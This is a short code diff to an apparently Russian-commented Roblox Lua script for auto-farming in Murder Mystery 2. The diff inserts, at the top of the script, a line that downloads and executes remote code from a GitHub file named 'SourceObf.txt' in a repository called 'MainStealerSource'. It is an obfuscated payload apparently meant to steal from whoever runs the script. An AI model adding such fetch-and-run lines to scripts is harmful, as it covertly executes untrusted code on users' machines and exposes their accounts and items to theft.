@@ -1,3 +1,6 @@
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/hubsrblx/MainStealerSource/refs/heads/main/SourceObf.txt')))()
+
 -- Проверка на уже запущенный скрипт
 if _G.AutoFarmMM2IsLoaded then return end
 _G.AutoFarmMM2IsLoaded = true
